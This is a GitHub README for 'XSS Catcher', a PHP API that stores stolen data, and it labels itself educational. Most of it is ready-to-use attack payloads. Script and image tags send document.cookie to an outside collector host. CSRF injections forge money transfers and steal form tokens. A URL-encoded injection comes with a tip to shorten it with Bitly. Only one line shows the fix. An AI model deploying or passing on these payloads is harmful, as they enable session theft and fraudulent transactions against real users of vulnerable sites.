# XSS Catcher

Simple API for storing all incoming XSS requests.

Every incoming XSS request must contain the `site` and `data` (i.e. stolen data) parameter. Optionally, you can add the `info` parameter.

This topic is very broad and only few client side injections were covered.

Tested on XAMPP for Windows v7.3.7 (64 bit) with Chrome v77.0.3865.120 (64-bit) and Firefox v70.0 (64-bit).

Made for educational purposes. I hope it will help!

## How to Run

Import ['\\db\\xss_catcher.sql'](https://github.com/ivan-sincek/xss-catcher/blob/master/db/xss_catcher.sql) to your database server.

Copy all the content from ['\\src\\'](https://github.com/ivan-sincek/xss-catcher/tree/master/src) to your server's web root directory (e.g. to '\\xampp\\htdocs\\' on XAMPP).

Change the database settings inside ['\\src\\php\\config.ini'](https://github.com/ivan-sincek/xss-catcher/tree/master/src/api/php/config.ini) as necessary.

Navigate to your database panel with your preferred web browser.

## Cross-Site Scripting

**Cookies must be missing the HttpOnly flag in order for you to steal them.**

Steal HTTP cookies by injecting the following JavaScript code:

```xhtml
<script>var xhr = new XMLHttpRequest(); xhr.open('POST', 'https://myserver.com/api/store.php', true); xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded'); xhr.send('site=' + encodeURIComponent(location.hostname + location.pathname) + '&data=' + encodeURIComponent(document.cookie));</script>
```

Example above will send an HTTP POST request with user-defined parameters as form-data. Opt for this example whenever possible.

To send user-defined parameters as form-data you must add the `Content-Type: application/x-www-form-urlencoded` HTTP request header.

Steal HTTP cookies by injecting the following HTML code:

```xhtml
<img src="https://github.com/favicon.ico" onload="var xhr = new XMLHttpRequest(); xhr.open('POST', 'https://myserver.com/api/store.php', true); xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded'); xhr.send('site=' + encodeURIComponent(location.hostname + location.pathname) + '&data=' + encodeURIComponent(document.cookie));" hidden="hidden">

<img src="https://github.com/favicon.ico" onload="this.src='https://myserver.com/api/store.php?site=' + encodeURIComponent(location.hostname) + location.pathname + '&data=' + encodeURIComponent(document.cookie)" hidden="hidden">
```

Second example above will send an HTTP GET request with data in a query string (i.e. URL).

## Cross-Site Request Forgery

**Try to figure out what kind of data does the backend server accept before you try to forge anything. Is it query string, form-data, raw data encoded in JSON, etc.?**

Plant a forged request by injecting the following JavaScript code:

```xhtml
<script>var xhr = new XMLHttpRequest(); xhr.open('POST', 'https://victim.com/transfer.php', true); xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded'); xhr.send('recipient=eve&amount=9000');</script>
```

Plant a forged request whilst stealing a web form token by injecting the following JavaScript code:

```xhtml
<script>window.onload = function() { var xhr = new XMLHttpRequest(); xhr.open('POST', 'https://victim.com/transfer.php', true); xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded'); xhr.send('recipient=eve&amount=9000&token=' + encodeURIComponent(document.getElementsByName('token')[0].value)); }</script>

<script>window.onload = function() { var xhr = new XMLHttpRequest(); xhr.open('GET', 'https://victim.com/transfer.php?recipient=eve&amount=9000&token=' + encodeURIComponent(document.getElementsByName('token')[0].value), true); xhr.send(); }</script>
```

To steal a web form token (or any other web form data) you must wait for the web form to fully render/load. You can do that by calling the `window.onload` event.

Plant a forged request by injecting the following CSS code:

```xhtml
<style>div { background-image: url('https://victim.com/transfer.php?recipient=eve&amount=9000'); }</style>
```

## Proof of Concept - No Input Sanitization

Vulnerable code:

```xhtml
<script>var language = '<?php if (isset($_GET["language"])) { echo $_GET["language"]; } ?>';</script>
```

Expected use:

```xhtml
<script>var language = 'en';</script>
```

User-supplied data:

```fundamental
en'; var xhr = new XMLHttpRequest(); xhr.open('POST', 'https://myserver.com/api/store.php', true); xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded'); xhr.send('site=' + encodeURIComponent(location.hostname + location.pathname) + '&data=' + encodeURIComponent(document.cookie)); var test = '
```

**Always make sure to properly close the surrounding code.**

Encode your code to the URL encoded format [here](https://www.urlencoder.org).

Final XSS request:

```fundamental
https://localhost/welcome.php?language=en%27%3B%20var%20xhr%20%3D%20new%20XMLHttpRequest%28%29%3B%20xhr.open%28%27POST%27%2C%20%27https%3A%2F%2Fmyserver.com%2Fapi%2Fstore.php%27%2C%20true%29%3B%20xhr.setRequestHeader%28%27Content-Type%27%2C%20%27application%2Fx-www-form-urlencoded%27%29%3B%20xhr.send%28%27site%3D%27%20%2B%20encodeURIComponent%28location.hostname%20%2B%20location.pathname%29%20%2B%20%27%26data%3D%27%20%2B%20encodeURIComponent%28document.cookie%29%29%3B%20var%20test%20%3D%20%27
```

You can also shorten your query string (i.e. URL) with [Bitly](https://bitly.com).

Solution:

```xhtml
<script>var language = '<?php if (isset($_GET["language"])) { echo htmlentities($_GET["language"], ENT_QUOTES, "UTF-8"); } ?>';</script>
```

## Images

![Database](https://github.com/ivan-sincek/xss-catcher/blob/master/img/db.jpg)
